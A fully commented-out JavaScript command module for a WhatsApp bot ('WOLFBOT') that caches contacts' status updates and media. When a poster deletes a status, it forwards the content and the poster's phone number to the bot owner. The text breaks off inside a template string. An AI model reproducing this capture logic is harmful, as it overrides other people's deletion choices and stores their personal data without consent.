




















// // File: ./commands/utility/antideletestatus.js - UPDATED WITH REAL NUMBERS & WOLFBOT THEME
// import fs from 'fs/promises';
// import path from 'path';
// import { fileURLToPath } from 'url';
// import { downloadMediaMessage } from '@whiskeysockets/baileys';

// const __filename = fileURLToPath(import.meta.url);
// const __dirname = path.dirname(__filename);

// // Storage paths
// const STATUS_STORAGE_DIR = './data/antidelete/status';
// const STATUS_MEDIA_DIR = path.join(STATUS_STORAGE_DIR, 'media');
// const STATUS_CACHE_FILE = path.join(STATUS_STORAGE_DIR, 'status_cache.json');
// const SETTINGS_FILE = path.join(STATUS_STORAGE_DIR, 'settings.json');

// // Cache cleaning settings
// const CACHE_CLEAN_INTERVAL = 24 * 60 * 60 * 1000; // 24 hours
// const MAX_CACHE_AGE = 24 * 60 * 60 * 1000; // 24 hours
// const MAX_MEDIA_SIZE_MB = 500; // Maximum storage size

// // Global state for status antidelete
// let statusAntideleteState = {
//     enabled: true,
//     mode: 'private',
//     ownerJid: null,
//     sock: null,
//     statusCache: new Map(), // Store status messages
//     deletedStatusCache: new Map(), // Store deleted statuses
//     mediaCache: new Map(),
//     stats: {
//         totalStatuses: 0,
//         deletedDetected: 0,
//         retrieved: 0,
//         mediaCaptured: 0,
//         sentToDm: 0,
//         cacheCleans: 0,
//         totalStorageMB: 0
//     },
//     settings: {
//         autoCleanEnabled: true,
//         maxAgeHours: 24,
//         maxStorageMB: 500,
//         ownerOnly: true,
//         autoCleanRetrieved: true, // Auto-clean retrieved statuses
//         initialized: false
//     },
//     cleanupInterval: null
// };

// // Status detection patterns
// const STATUS_PATTERNS = {
//     STATUS_JID: 'status@broadcast',
//     DELETE_STUB_TYPES: {
//         REVOKE: 7,
//         REVOKE_EVERYONE: 8
//     }
// };

// // Ensure directories exist
// async function ensureStatusDirs() {
//     try {
//         await fs.mkdir(STATUS_STORAGE_DIR, { recursive: true });
//         await fs.mkdir(STATUS_MEDIA_DIR, { recursive: true });
//         return true;
//     } catch (error) {
//         console.error('❌ Status Antidelete: Failed to create directories:', error.message);
//         return false;
//     }
// }

// // Load saved data from JSON
// async function loadStatusData() {
//     try {
//         await ensureStatusDirs();
        
//         // Load settings first
//         if (await fs.access(SETTINGS_FILE).then(() => true).catch(() => false)) {
//             const settingsData = JSON.parse(await fs.readFile(SETTINGS_FILE, 'utf8'));
//             statusAntideleteState.settings = { ...statusAntideleteState.settings, ...settingsData };
//         }
        
//         if (await fs.access(STATUS_CACHE_FILE).then(() => true).catch(() => false)) {
//             const data = JSON.parse(await fs.readFile(STATUS_CACHE_FILE, 'utf8'));
            
//             // Restore mode from saved data if exists
//             if (data.mode) {
//                 statusAntideleteState.mode = data.mode;
//             }
            
//             // Load status cache from JSON
//             if (data.statusCache && Array.isArray(data.statusCache)) {
//                 statusAntideleteState.statusCache.clear();
//                 data.statusCache.forEach(([key, value]) => {
//                     statusAntideleteState.statusCache.set(key, value);
//                 });
//             }
            
//             // Load deleted status cache from JSON
//             if (data.deletedStatusCache && Array.isArray(data.deletedStatusCache)) {
//                 statusAntideleteState.deletedStatusCache.clear();
//                 data.deletedStatusCache.forEach(([key, value]) => {
//                     statusAntideleteState.deletedStatusCache.set(key, value);
//                 });
//             }
            
//             // Load media cache from JSON (only metadata, not actual buffer)
//             if (data.mediaCache && Array.isArray(data.mediaCache)) {
//                 statusAntideleteState.mediaCache.clear();
//                 data.mediaCache.forEach(([key, value]) => {
//                     // Only store file path and metadata, not the actual buffer
//                     statusAntideleteState.mediaCache.set(key, {
//                         filePath: value.filePath,
//                         type: value.type,
//                         mimetype: value.mimetype,
//                         size: value.size,
//                         isStatus: value.isStatus,
//                         savedAt: value.savedAt
//                     });
//                 });
//             }
            
//             if (data.stats) {
//                 statusAntideleteState.stats = { ...statusAntideleteState.stats, ...data.stats };
//             }
            
//             console.log(`✅ Status Antidelete: Loaded ${statusAntideleteState.statusCache.size} statuses, ${statusAntideleteState.deletedStatusCache.size} deleted statuses from JSON`);
//         }
        
//         // Calculate total storage
//         await calculateStorageSize();
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error loading JSON data:', error.message);
//     }
// }

// // Save data to JSON
// async function saveStatusData() {
//     try {
//         await ensureStatusDirs();
        
//         // Prepare data for JSON (exclude buffers to save memory)
//         const data = {
//             mode: statusAntideleteState.mode,
//             statusCache: Array.from(statusAntideleteState.statusCache.entries()),
//             deletedStatusCache: Array.from(statusAntideleteState.deletedStatusCache.entries()),
//             mediaCache: Array.from(statusAntideleteState.mediaCache.entries()).map(([key, value]) => {
//                 // Only save metadata, not the buffer
//                 return [key, {
//                     filePath: value.filePath,
//                     type: value.type,
//                     mimetype: value.mimetype,
//                     size: value.size,
//                     isStatus: value.isStatus,
//                     savedAt: value.savedAt
//                 }];
//             }),
//             stats: statusAntideleteState.stats,
//             savedAt: Date.now()
//         };
        
//         // Write to JSON file
//         await fs.writeFile(STATUS_CACHE_FILE, JSON.stringify(data, null, 2));
        
//         // Save settings separately
//         await fs.writeFile(SETTINGS_FILE, JSON.stringify(statusAntideleteState.settings, null, 2));
        
//         console.log(`💾 Status Antidelete: Saved data to JSON (${statusAntideleteState.statusCache.size} statuses, ${statusAntideleteState.deletedStatusCache.size} deleted)`);
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error saving JSON data:', error.message);
//     }
// }

// // Calculate total storage size
// async function calculateStorageSize() {
//     try {
//         let totalBytes = 0;
        
//         // Calculate media file sizes
//         const files = await fs.readdir(STATUS_MEDIA_DIR);
//         for (const file of files) {
//             const filePath = path.join(STATUS_MEDIA_DIR, file);
//             const stats = await fs.stat(filePath);
//             totalBytes += stats.size;
//         }
        
//         // Add cache file size
//         if (await fs.access(STATUS_CACHE_FILE).then(() => true).catch(() => false)) {
//             const stats = await fs.stat(STATUS_CACHE_FILE);
//             totalBytes += stats.size;
//         }
        
//         // Add settings file size
//         if (await fs.access(SETTINGS_FILE).then(() => true).catch(() => false)) {
//             const stats = await fs.stat(SETTINGS_FILE);
//             totalBytes += stats.size;
//         }
        
//         statusAntideleteState.stats.totalStorageMB = Math.round(totalBytes / 1024 / 1024);
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error calculating storage:', error.message);
//     }
// }

// // Get REAL WhatsApp number from JID (like your example)
// function getRealWhatsAppNumber(jid) {
//     if (!jid) return 'Unknown';
    
//     try {
//         // Extract the number part (before @)
//         const numberPart = jid.split('@')[0];
        
//         // Remove any non-numeric characters except +
//         let cleanNumber = numberPart.replace(/[^\d+]/g, '');
        
//         // Handle phone numbers without country code
//         if (cleanNumber.length >= 10 && !cleanNumber.startsWith('+')) {
//             // If it's 10-15 digits, assume it's a phone number
//             if (cleanNumber.length >= 10 && cleanNumber.length <= 15) {
//                 return `+${cleanNumber}`;
//             }
//         }
        
//         // If it's a valid WhatsApp JID with country code
//         if (cleanNumber.startsWith('+') && cleanNumber.length >= 12) {
//             return cleanNumber;
//         }
        
//         // For status senders, it might be a raw number
//         if (cleanNumber && /^\d+$/.test(cleanNumber) && cleanNumber.length >= 10) {
//             return `+${cleanNumber}`;
//         }
        
//         return numberPart || 'Unknown';
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error extracting real number:', error.message);
//         return 'Unknown';
//     }
// }

// // Clean retrieved statuses from JSON (auto-clean after sending)
// async function cleanRetrievedStatus(statusId) {
//     try {
//         if (!statusAntideleteState.settings.autoCleanRetrieved) {
//             return;
//         }
        
//         // Remove from status cache
//         statusAntideleteState.statusCache.delete(statusId);
        
//         // Remove media cache entry (but keep the file for now)
//         statusAntideleteState.mediaCache.delete(statusId);
        
//         // Immediately save to JSON to free memory
//         await saveStatusData();
        
//         console.log(`🧹 Status Antidelete: Cleaned retrieved status ${statusId} from JSON`);
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error cleaning retrieved status:', error.message);
//     }
// }

// // Auto-clean old cache from JSON
// async function autoCleanCache() {
//     try {
//         if (!statusAntideleteState.settings.autoCleanEnabled) {
//             console.log('🔄 Status Antidelete: Auto-clean disabled, skipping...');
//             return;
//         }
        
//         console.log('🧹 Status Antidelete: Starting auto-clean from JSON...');
//         const now = Date.now();
//         const maxAge = statusAntideleteState.settings.maxAgeHours * 60 * 60 * 1000;
//         let cleanedCount = 0;
//         let cleanedMedia = 0;
        
//         // Clean old statuses from cache and JSON
//         for (const [key, status] of statusAntideleteState.statusCache.entries()) {
//             if (now - status.timestamp > maxAge) {
//                 statusAntideleteState.statusCache.delete(key);
//                 cleanedCount++;
//             }
//         }
        
//         // Clean old deleted statuses
//         for (const [key, deletedStatus] of statusAntideleteState.deletedStatusCache.entries()) {
//             if (now - deletedStatus.timestamp > maxAge) {
//                 statusAntideleteState.deletedStatusCache.delete(key);
//                 cleanedCount++;
//             }
//         }
        
//         // Clean old media files and their JSON entries
//         const files = await fs.readdir(STATUS_MEDIA_DIR);
//         for (const file of files) {
//             const filePath = path.join(STATUS_MEDIA_DIR, file);
//             const stats = await fs.stat(filePath);
            
//             const fileAge = now - stats.mtimeMs;
//             if (fileAge > maxAge) {
//                 try {
//                     await fs.unlink(filePath);
                    
//                     // Remove from media cache
//                     for (const [key, media] of statusAntideleteState.mediaCache.entries()) {
//                         if (media.filePath === filePath) {
//                             statusAntideleteState.mediaCache.delete(key);
//                             break;
//                         }
//                     }
                    
//                     cleanedMedia++;
//                 } catch (error) {
//                     console.error(`❌ Could not delete ${file}:`, error.message);
//                 }
//             }
//         }
        
//         // Check storage limit
//         await calculateStorageSize();
//         if (statusAntideleteState.stats.totalStorageMB > statusAntideleteState.settings.maxStorageMB) {
//             console.log(`⚠️ Status Antidelete: Storage limit reached (${statusAntideleteState.stats.totalStorageMB}MB > ${statusAntideleteState.settings.maxStorageMB}MB)`);
//             // Force cleanup of oldest files
//             await forceCleanup();
//         }
        
//         if (cleanedCount > 0 || cleanedMedia > 0) {
//             statusAntideleteState.stats.cacheCleans++;
//             await saveStatusData();
//             console.log(`✅ Status Antidelete: Auto-clean completed. Removed ${cleanedCount} entries and ${cleanedMedia} media files from JSON.`);
//         } else {
//             console.log('✅ Status Antidelete: Auto-clean completed (nothing to clean).');
//         }
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Auto-clean error:', error.message);
//     }
// }

// // Force cleanup when storage limit reached
// async function forceCleanup() {
//     try {
//         console.log('⚠️ Status Antidelete: Force cleanup initiated...');
        
//         // Get all media files sorted by age (oldest first)
//         const files = await fs.readdir(STATUS_MEDIA_DIR);
//         const fileStats = await Promise.all(
//             files.map(async (file) => {
//                 const filePath = path.join(STATUS_MEDIA_DIR, file);
//                 const stats = await fs.stat(filePath);
//                 return { file, filePath, mtimeMs: stats.mtimeMs, size: stats.size };
//             })
//         );
        
//         fileStats.sort((a, b) => a.mtimeMs - b.mtimeMs); // Sort by oldest first
        
//         // Delete oldest files until under limit
//         let deletedSize = 0;
//         const targetSize = statusAntideleteState.settings.maxStorageMB * 1024 * 1024 * 0.8; // Target 80% of max
        
//         for (const fileStat of fileStats) {
//             if (statusAntideleteState.stats.totalStorageMB * 1024 * 1024 <= targetSize) {
//                 break;
//             }
            
//             try {
//                 await fs.unlink(fileStat.filePath);
//                 deletedSize += fileStat.size;
                
//                 // Remove from media cache
//                 for (const [key, media] of statusAntideleteState.mediaCache.entries()) {
//                     if (media.filePath === fileStat.filePath) {
//                         statusAntideleteState.mediaCache.delete(key);
//                         break;
//                     }
//                 }
                
//                 console.log(`🗑️ Force deleted: ${fileStat.file}`);
//             } catch (error) {
//                 console.error(`❌ Could not delete ${fileStat.file}:`, error.message);
//             }
//         }
        
//         // Clear oldest cache entries
//         const cacheEntries = Array.from(statusAntideleteState.statusCache.entries());
//         cacheEntries.sort((a, b) => a[1].timestamp - b[1].timestamp); // Sort by oldest
        
//         for (let i = 0; i < Math.min(10, cacheEntries.length); i++) {
//             statusAntideleteState.statusCache.delete(cacheEntries[i][0]);
//         }
        
//         await calculateStorageSize();
//         await saveStatusData();
        
//         console.log(`✅ Force cleanup completed. Freed ${Math.round(deletedSize / 1024 / 1024)}MB`);
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Force cleanup error:', error.message);
//     }
// }

// // Start auto-clean interval
// function startAutoClean() {
//     if (statusAntideleteState.cleanupInterval) {
//         clearInterval(statusAntideleteState.cleanupInterval);
//     }
    
//     statusAntideleteState.cleanupInterval = setInterval(async () => {
//         await autoCleanCache();
//     }, CACHE_CLEAN_INTERVAL);
    
//     console.log(`🔄 Status Antidelete: Auto-clean scheduled every ${CACHE_CLEAN_INTERVAL / 1000 / 60 / 60} hours`);
// }

// // Stop auto-clean interval
// function stopAutoClean() {
//     if (statusAntideleteState.cleanupInterval) {
//         clearInterval(statusAntideleteState.cleanupInterval);
//         statusAntideleteState.cleanupInterval = null;
//         console.log('🛑 Status Antidelete: Auto-clean stopped');
//     }
// }

// // Get file extension from mimetype for status media
// function getStatusExtensionFromMime(mimetype) {
//     const mimeToExt = {
//         'image/jpeg': '.jpg',
//         'image/jpg': '.jpg',
//         'image/png': '.png',
//         'image/gif': '.gif',
//         'image/webp': '.webp',
//         'video/mp4': '.mp4',
//         'video/3gpp': '.3gp',
//         'audio/mpeg': '.mp3',
//         'audio/mp4': '.m4a',
//         'audio/ogg': '.ogg',
//         'audio/aac': '.aac',
//         'image/vnd.wap.wbmp': '.wbmp'
//     };
    
//     return mimeToExt[mimetype] || '.bin';
// }

// // Download and save status media (optimized for memory)
// async function downloadAndSaveStatusMedia(msgId, message, messageType, mimetype) {
//     try {
//         const buffer = await downloadMediaMessage(
//             message,
//             'buffer',
//             {},
//             {
//                 logger: { level: 'silent' },
//                 reuploadRequest: statusAntideleteState.sock?.updateMediaMessage
//             }
//         );
        
//         if (!buffer || buffer.length === 0) {
//             return null;
//         }
        
//         // Check file size (max 10MB to prevent memory issues)
//         const maxSize = 10 * 1024 * 1024; // 10MB
//         if (buffer.length > maxSize) {
//             console.log(`⚠️ Status Antidelete: Media too large (${Math.round(buffer.length/1024/1024)}MB), skipping...`);
//             return null;
//         }
        
//         const timestamp = Date.now();
//         const extension = getStatusExtensionFromMime(mimetype);
//         const filename = `status_${messageType}_${timestamp}${extension}`;
//         const filePath = path.join(STATUS_MEDIA_DIR, filename);
        
//         // Write file directly to disk without storing buffer in memory
//         await fs.writeFile(filePath, buffer);
        
//         // Store only metadata in cache, not the buffer
//         statusAntideleteState.mediaCache.set(msgId, {
//             filePath: filePath,
//             type: messageType,
//             mimetype: mimetype,
//             size: buffer.length,
//             isStatus: true,
//             savedAt: timestamp
//         });
        
//         statusAntideleteState.stats.mediaCaptured++;
        
//         // Calculate storage and save to JSON immediately
//         await calculateStorageSize();
        
//         console.log(`📸 Status Antidelete: Saved status ${messageType} media: ${filename} (${Math.round(buffer.length/1024)}KB)`);
//         return filePath;
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Media download error:', error.message);
//         return null;
//     }
// }

// // Check if message is a status update
// function isStatusMessage(message) {
//     try {
//         const msgKey = message.key;
//         if (!msgKey) return false;
        
//         // Check if it's from status broadcast
//         if (msgKey.remoteJid === STATUS_PATTERNS.STATUS_JID) {
//             return true;
//         }
        
//         return false;
//     } catch (error) {
//         return false;
//     }
// }

// // Extract status information from message
// function extractStatusInfo(message) {
//     try {
//         const msgKey = message.key;
//         const senderJid = msgKey.participant || msgKey.remoteJid;
//         const pushName = message.pushName || 'Unknown User';
//         const timestamp = message.messageTimestamp * 1000 || Date.now();
        
//         // Get real WhatsApp number
//         const realNumber = getRealWhatsAppNumber(senderJid);
        
//         const msgContent = message.message;
//         let type = 'text';
//         let text = '';
//         let hasMedia = false;
//         let mediaInfo = null;
//         let mimetype = '';
        
//         if (msgContent?.imageMessage) {
//             type = 'image';
//             text = msgContent.imageMessage.caption || '';
//             hasMedia = true;
//             mimetype = msgContent.imageMessage.mimetype || 'image/jpeg';
//             mediaInfo = { message, type: 'image', mimetype };
//         } else if (msgContent?.videoMessage) {
//             type = 'video';
//             text = msgContent.videoMessage.caption || '';
//             hasMedia = true;
//             mimetype = msgContent.videoMessage.mimetype || 'video/mp4';
//             mediaInfo = { message, type: 'video', mimetype };
//         } else if (msgContent?.audioMessage) {
//             type = 'audio';
//             hasMedia = true;
//             mimetype = msgContent.audioMessage.mimetype || 'audio/mpeg';
//             if (msgContent.audioMessage.ptt) {
//                 type = 'voice';
//             }
//             mediaInfo = { message, type: 'audio', mimetype };
//         } else if (msgContent?.extendedTextMessage?.text) {
//             type = 'text';
//             text = msgContent.extendedTextMessage.text;
//         } else if (msgContent?.conversation) {
//             type = 'text';
//             text = msgContent.conversation;
//         }
        
//         if (!text && !hasMedia) {
//             type = 'status_update';
//         }
        
//         return {
//             senderJid,
//             realNumber,
//             pushName,
//             timestamp,
//             type,
//             text,
//             hasMedia,
//             mediaInfo,
//             mimetype,
//             isStatus: true
//         };
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error extracting status info:', error.message);
//         return null;
//     }
// }

// // Store incoming status message (optimized for memory)
// async function storeStatusMessage(message) {
//     try {
//         if (!statusAntideleteState.sock || statusAntideleteState.mode === 'off') return;
        
//         if (!isStatusMessage(message)) return;
        
//         const msgKey = message.key;
//         const msgId = msgKey.id;
//         if (!msgId || msgKey.fromMe) return;
        
//         const statusInfo = extractStatusInfo(message);
//         if (!statusInfo) return;
        
//         const statusData = {
//             id: msgId,
//             chatJid: msgKey.remoteJid,
//             senderJid: statusInfo.senderJid,
//             realNumber: statusInfo.realNumber,
//             pushName: statusInfo.pushName,
//             timestamp: statusInfo.timestamp,
//             type: statusInfo.type,
//             text: statusInfo.text || '',
//             hasMedia: statusInfo.hasMedia,
//             mimetype: statusInfo.mimetype,
//             isStatus: true
//         };
        
//         // Store in cache
//         statusAntideleteState.statusCache.set(msgId, statusData);
//         statusAntideleteState.stats.totalStatuses++;
        
//         // console.log(`📱 Status Antidelete: Stored status from ${statusInfo.pushName} (${statusInfo.realNumber})`);
        
//         // Download media if present (with delay to prevent memory spikes)
//         if (statusInfo.hasMedia && statusInfo.mediaInfo) {
//             // Add random delay to prevent concurrent downloads
//             const delay = Math.random() * 2000 + 1000; // 1-3 seconds
//             setTimeout(async () => {
//                 try {
//                     await downloadAndSaveStatusMedia(msgId, statusInfo.mediaInfo.message, statusInfo.type, statusInfo.mimetype);
//                     await saveStatusData();
//                 } catch (error) {
//                     console.error('❌ Status Antidelete: Async media download failed:', error.message);
//                 }
//             }, delay);
//         }
        
//         // Save to JSON periodically (but not too often)
//         if (statusAntideleteState.statusCache.size % 5 === 0) {
//             await saveStatusData();
//         }
        
//         return statusData;
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error storing status:', error.message);
//         return null;
//     }
// }

// // Check if status is deleted
// function isStatusDeleted(update) {
//     try {
//         const msgKey = update.key;
//         if (!msgKey || !msgKey.id) return false;
        
//         if (msgKey.remoteJid !== STATUS_PATTERNS.STATUS_JID) return false;
        
//         const isDeleted = 
//             update.message === null ||
//             update.update?.status === 6 ||
//             update.update?.message === null ||
//             update.messageStubType === STATUS_PATTERNS.DELETE_STUB_TYPES.REVOKE ||
//             update.messageStubType === STATUS_PATTERNS.DELETE_STUB_TYPES.REVOKE_EVERYONE ||
//             update.messageStubParameters?.[0]?.key?.id === msgKey.id;
        
//         return isDeleted;
        
//     } catch (error) {
//         return false;
//     }
// }

// // Handle deleted status (with auto-clean from JSON)
// async function handleDeletedStatus(update) {
//     try {
//         if (!statusAntideleteState.sock || statusAntideleteState.mode === 'off') return;
        
//         const msgKey = update.key;
//         if (!msgKey || !msgKey.id) return;
        
//         const msgId = msgKey.id;
        
//         if (!isStatusDeleted(update)) return;
        
//         console.log(`🔍 Status Antidelete: Checking deletion for status ${msgId}`);
        
//         const cachedStatus = statusAntideleteState.statusCache.get(msgId);
//         if (!cachedStatus) {
//             console.log(`⚠️ Status Antidelete: Status ${msgId} not found in cache`);
//             return;
//         }
        
//         // Move to deleted cache
//         statusAntideleteState.statusCache.delete(msgId);
//         statusAntideleteState.deletedStatusCache.set(msgId, {
//             ...cachedStatus,
//             deletedAt: Date.now()
//         });
        
//         statusAntideleteState.stats.deletedDetected++;
        
//         console.log(`🗑️ Status Antidelete: Status deleted from ${cachedStatus.pushName} (${cachedStatus.realNumber})`);
        
//         // Send to owner DM
//         if (statusAntideleteState.mode === 'private') {
//             const sent = await sendStatusToOwnerDM(cachedStatus);
//             if (sent) {
//                 statusAntideleteState.stats.sentToDm++;
                
//                 // Auto-clean retrieved status from JSON
//                 await cleanRetrievedStatus(msgId);
//             }
//         }
        
//         statusAntideleteState.stats.retrieved++;
        
//         // Save to JSON
//         await saveStatusData();
        
//         console.log(`✅ Status Antidelete: Retrieved deleted status from ${cachedStatus.pushName} (${cachedStatus.realNumber})`);
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error handling deleted status:', error.message);
//     }
// }

// // Send deleted status to owner DM - UPDATED WITH WOLFBOT THEME
// async function sendStatusToOwnerDM(statusData) {
//     try {
//         if (!statusAntideleteState.sock || !statusAntideleteState.ownerJid) {
//             console.error('❌ Status Antidelete: Socket or owner JID not set');
//             return false;
//         }
        
//         const ownerJid = statusAntideleteState.ownerJid;
//         const time = new Date(statusData.timestamp).toLocaleString();
        
//         // Format number like @1234567890
//         const formattedNumber = statusData.realNumber.startsWith('+') ? 
//             `@${statusData.realNumber.substring(1)}` : `@${statusData.realNumber}`;
        
//         // Build message with WOLFBOT theme and wolf emoji 🐺
//         let detailsText = `\n\n◉ 𝗪𝗢𝗟𝗙𝗕𝗢𝗧 𝘀𝘁𝗮𝘁𝘂𝘀 𝗮𝗻𝘁𝗶𝗱𝗲𝗹𝗲𝘁𝗲 🐺\n`;
//         detailsText += `◉ 𝗦𝘁𝗮𝘁𝘂𝘀 𝗱𝗲𝗹𝗲𝘁𝗲𝗱 𝗯𝘆: ${formattedNumber}\n`;
//         detailsText += `◉ 𝗣𝗼𝘀𝘁𝗲𝗱 𝗯𝘆: ${formattedNumber} (${statusData.pushName})\n`;
//         detailsText += `◉ 𝗧𝗶𝗺𝗲: ${time}\n`;
//         detailsText += `◉ 𝗧𝘆𝗽𝗲: ${statusData.type.toUpperCase()} STATUS\n`;
        
//         if (statusData.text) {
//             detailsText += `\n◉ 𝗦𝘁𝗮𝘁𝘂𝘀 𝗰𝗮𝗽𝘁𝗶𝗼𝗻:\n${statusData.text}`;
//         } else if (statusData.hasMedia) {
//             detailsText += `\n◉ 𝗦𝘁𝗮𝘁𝘂𝘀 𝘁𝘆𝗽𝗲: ${statusData.type.toUpperCase()} (No caption)`;
//         } else {
//             detailsText += `\n◉ 𝗦𝘁𝗮𝘁𝘂𝘀 𝘁𝘆𝗽𝗲: Text only`;
//         }
        
//         detailsText += `\n\n◉ 𝗪𝗢𝗟𝗙𝗕𝗢𝗧 🐺: Status retrieved successfully`;
        
//         // Check if we have media
//         const mediaCache = statusAntideleteState.mediaCache.get(statusData.id);
        
//         if (statusData.hasMedia && mediaCache) {
//             try {
//                 // Read file directly from disk when needed
//                 const buffer = await fs.readFile(mediaCache.filePath);
                
//                 if (buffer && buffer.length > 0) {
//                     if (statusData.type === 'image') {
//                         await statusAntideleteState.sock.sendMessage(ownerJid, {
//                             image: buffer,
//                             caption: detailsText,
//                             mimetype: mediaCache.mimetype
//                         });
//                     } else if (statusData.type === 'video') {
//                         await statusAntideleteState.sock.sendMessage(ownerJid, {
//                             video: buffer,
//                             caption: detailsText,
//                             mimetype: mediaCache.mimetype
//                         });
//                     } else if (statusData.type === 'audio' || statusData.type === 'voice') {
//                         await statusAntideleteState.sock.sendMessage(ownerJid, {
//                             audio: buffer,
//                             mimetype: mediaCache.mimetype,
//                             ptt: statusData.type === 'voice'
//                         });
//                         // Send details separately
//                         await statusAntideleteState.sock.sendMessage(ownerJid, { text: detailsText });
//                     } else {
//                         await statusAntideleteState.sock.sendMessage(ownerJid, { text: detailsText });
//                     }
//                 } else {
//                     await statusAntideleteState.sock.sendMessage(ownerJid, { text: detailsText });
//                 }
//             } catch (mediaError) {
//                 console.error('❌ Status Antidelete: Media send error:', mediaError.message);
//                 await statusAntideleteState.sock.sendMessage(ownerJid, { 
//                     text: detailsText + `\n\n❌ 𝗦𝘁𝗮𝘁𝘂𝘀 𝗺𝗲𝗱𝗶𝗮 𝗰𝗼𝘂𝗹𝗱 𝗻𝗼𝘁 𝗯𝗲 𝗿𝗲𝗰𝗼𝘃𝗲𝗿𝗲𝗱` 
//                 });
//             }
//         } else {
//             await statusAntideleteState.sock.sendMessage(ownerJid, { text: detailsText });
//         }
        
//         console.log(`📤 Status Antidelete: Sent status to owner DM from ${formattedNumber}`);
//         return true;
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Error sending to owner DM:', error.message);
//         return false;
//     }
// }

// // Setup listeners for status messages
// function setupStatusListeners(sock) {
//     if (!sock) {
//         console.error('❌ Status Antidelete: No socket provided');
//         return;
//     }
    
//     statusAntideleteState.sock = sock;
    
//     console.log('🚀 Status Antidelete: Setting up listeners...');
    
//     // Listen for incoming messages and check if they're statuses
//     sock.ev.on('messages.upsert', async ({ messages, type }) => {
//         try {
//             if (type !== 'notify' || statusAntideleteState.mode === 'off') return;
            
//             for (const message of messages) {
//                 if (isStatusMessage(message)) {
//                     await storeStatusMessage(message);
//                 }
//             }
//         } catch (error) {
//             console.error('❌ Status Antidelete: Status storage error:', error.message);
//         }
//     });
    
//     // Listen for message updates (deletions)
//     sock.ev.on('messages.update', async (updates) => {
//         try {
//             if (statusAntideleteState.mode === 'off') return;
            
//             for (const update of updates) {
//                 await handleDeletedStatus(update);
//             }
//         } catch (error) {
//             console.error('❌ Status Antidelete: Status deletion detection error:', error.message);
//         }
//     });
    
//     console.log('✅ Status Antidelete: Listeners active');
// }

// // Initialize status antidelete system
// async function initializeStatusSystem(sock) {
//     try {
//         // Load existing data from JSON
//         await loadStatusData();
        
//         // Set owner JID from socket
//         if (sock.user?.id) {
//             statusAntideleteState.ownerJid = sock.user.id;
//             console.log(`👑 Status Antidelete: Owner set to ${sock.user.id}`);
//         }
        
//         // Setup listeners if mode is not off
//         if (statusAntideleteState.mode !== 'off') {
//             setupStatusListeners(sock);
//         }
        
//         // Start auto-clean if enabled
//         if (statusAntideleteState.settings.autoCleanEnabled) {
//             startAutoClean();
//         }
        
//         // Mark as initialized
//         statusAntideleteState.settings.initialized = true;
//         await saveStatusData();
        
//         // console.log(`🎯 Status Antidelete: System initialized`);
//         // console.log(`   Mode: ${statusAntideleteState.mode.toUpperCase()}`);
//         // console.log(`   Status: ${statusAntideleteState.mode === 'off' ? '❌ INACTIVE' : '✅ ACTIVE'}`);
//         // console.log(`   Cached: ${statusAntideleteState.statusCache.size} statuses`);
//         // console.log(`   Storage: ${statusAntideleteState.stats.totalStorageMB}MB`);
//         // console.log(`   Auto-clean: ${statusAntideleteState.settings.autoCleanEnabled ? '✅ ENABLED' : '❌ DISABLED'}`);
//         // console.log(`   Clean Retrieved: ${statusAntideleteState.settings.autoCleanRetrieved ? '✅ ENABLED' : '❌ DISABLED'}`);
        
//     } catch (error) {
//         console.error('❌ Status Antidelete: Initialization error:', error.message);
//     }
// }

// // Export initialization function
// export async function initStatusAntidelete(sock) {
//     await initializeStatusSystem(sock);
// }

// // The command module - OWNER-ONLY WITH WOLFBOT THEME
// export default {
//     name: 'antideletestatus',
//     alias: ['statusantidelete', 'sad', 'ads', 'statuswolf', 'wolfstatus'],
//     description: '🐺 Capture deleted WhatsApp status updates with real numbers - WOLFBOT owner only',
//     category: 'owner',
//     ownerOnly: true,
    
//     async execute(sock, msg, args, prefix, metadata = {}) {
//         const chatId = msg.key.remoteJid;
//         const command = args[0]?.toLowerCase() || 'status';
        
//         // OWNER CHECK
//         const { jidManager } = metadata || {};
//         if (!jidManager || !jidManager.isOwner(msg)) {
//             return sock.sendMessage(chatId, {
//                 text: `❌ *Owner Only Command!*\n\nOnly the WOLFBOT 🐺 owner can use status antidelete commands.`
//             }, { quoted: msg });
//         }
        
//         // Ensure system has socket
//         if (!statusAntideleteState.sock) {
//             statusAntideleteState.sock = sock;
//         }
        
//         // Set owner from metadata if available
//         if (!statusAntideleteState.ownerJid && metadata.OWNER_JID) {
//             statusAntideleteState.ownerJid = metadata.OWNER_JID;
//         }
        
//         switch (command) {
//             case 'private':
//             case 'on':
//             case 'enable':
//                 statusAntideleteState.mode = 'private';
//                 setupStatusListeners(sock);
                
//                 if (statusAntideleteState.settings.autoCleanEnabled) {
//                     startAutoClean();
//                 }
                
//                 await saveStatusData();
                
//                 await sock.sendMessage(chatId, {
//                     text: `🐺 *WOLFBOT STATUS ANTIDELETE: ENABLED*\n\n◉ Mode: PRIVATE MODE\n◉ Deleted status updates will be sent to your DM only\n◉ Shows REAL WhatsApp numbers (e.g., @1234567890)\n\n📊 *Stats:*\n◉ Storage: ${statusAntideleteState.stats.totalStorageMB}MB\n◉ Auto-clean: ${statusAntideleteState.settings.autoCleanEnabled ? '✅ ENABLED' : '❌ DISABLED'}\n◉ Clean Retrieved: ${statusAntideleteState.settings.autoCleanRetrieved ? '✅ ENABLED' : '❌ DISABLED'}\n\n💾 Data stored in JSON format to save memory.`
//                 }, { quoted: msg });
//                 break;
                
//             case 'off':
//             case 'disable':
//                 statusAntideleteState.mode = 'off';
//                 stopAutoClean();
//                 statusAntideleteState.sock = null;
//                 await saveStatusData();
                
//                 await sock.sendMessage(chatId, {
//                     text: `🐺 *WOLFBOT STATUS ANTIDELETE: DISABLED*\n\n◉ System is now OFF\n◉ No statuses will be captured or retrieved\n◉ All cached data remains in JSON storage`
//                 }, { quoted: msg });
//                 break;
                
//             case 'status':
//             case 'stats':
//                 const statsText = `
// 🐺 *WOLFBOT STATUS ANTIDELETE*
// 💡 *Usage:*
